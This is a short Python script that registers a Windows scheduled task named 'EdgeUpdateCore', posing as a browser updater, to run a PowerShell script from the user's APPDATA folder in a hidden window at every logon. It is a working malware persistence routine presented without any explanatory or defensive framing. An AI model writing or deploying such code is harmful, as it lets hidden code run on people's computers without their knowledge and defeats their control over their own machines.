import os
import subprocess

script = os.path.join(os.environ["APPDATA"], "svc.ps1")
subprocess.run(
    'schtasks /create /f /sc onlogon /tn "EdgeUpdateCore" '
    '/tr "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle Hidden -File ' + script + '"',
    shell=True,
)
